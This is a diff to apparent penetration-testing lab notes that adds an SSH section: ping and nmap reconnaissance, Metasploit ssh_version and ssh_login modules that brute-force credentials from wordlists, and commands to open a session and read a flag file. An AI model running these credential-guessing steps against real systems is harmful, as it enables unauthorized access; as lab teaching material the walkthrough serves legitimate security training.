@@ -840,11 +840,11 @@ auxiliary/scanner/mysql/mysql_schemadump
 auxiliary/scanner/mysql/mysql_writable_dirs
 
 
-Tools
+### Tools
 The best tools for this are:
 
-Nmap
-Metasploit Framework
+- Nmap
+- Metasploit Framework
 
 
 In the beginning we have to ping the target
@@ -998,6 +998,94 @@ run
 Conclusion
 we explored different MySQL related metasploit modules that we can run against the target and gather sensitive information.
 
+# Secure Shell (SSH)
+
+SSH (Secure Shell) is a network protocol that allows secure access to remote systems over an unsecured network. It provides encrypted communication between a client and a server, typically used for remote administration, file transfers, and tunneling.
+
+we will look at a couple of SSH related metasploit modules and run them against the target.
+
+
+Objective: Your task is to run the following auxiliary modules against the target:
+
+auxiliary/scanner/ssh/ssh_version
+auxiliary/scanner/ssh/ssh_login
+
+
+The following username and password dictionary will be useful: 
+- /usr/share/metasploit-framework/data/wordlists/common_users.txt
+- /usr/share/metasploit-framework/data/wordlists/common_passwords.txt
+
+
+### Tools
+The best tools for this are:
+
+- Nmap
+- Metasploit Framework
+
+Step 1: Open the Kali machine.
+
+Step 2: Check if the target machine is reachable:
+
+Command:
+
+```bash
+ping -c 5 IP
+```
+
+The target is reachable.
+
+```bash
+ping -c 5 IP
+```
+
+Step 3: Run an Nmap scan against the target:
+
+Command:
+
+```bash
+nmap -sS -sV IP
+```
+
+Step 4: We have discovered ssh service is running on the target machine. We will use the provided auxiliary modules against target.
+
+Commands:
+
+```bahs
+msfconsole
+use auxiliary/scanner/ssh/ssh_version
+set RHOSTS IP
+exploit
+```
+
+We will now use ssh_login module to find the valid credentials to access the ssh server.
+
+Commands:
+
+```bash
+use auxiliary/scanner/ssh/ssh_login
+set RHOSTS IP
+set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
+set PASS_FILE /usr/share/metasploit-framework/data/wordlists/common_passwords.txt
+set STOP_ON_SUCCESS true
+set VERBOSE true
+exploit
+```
+
+Step 5: Find the files.
+
+NOTE: This example we will search about FLAG, but in other cases it might be another name.
+
+Commands:
+
+```bash
+sessions
+sessions -i 1
+find / -name "flag"
+cat /flag
+```
+
+Conclusion
+we explored a couple of metasploit modules related to SSH and ran them against the target.
 
 
 
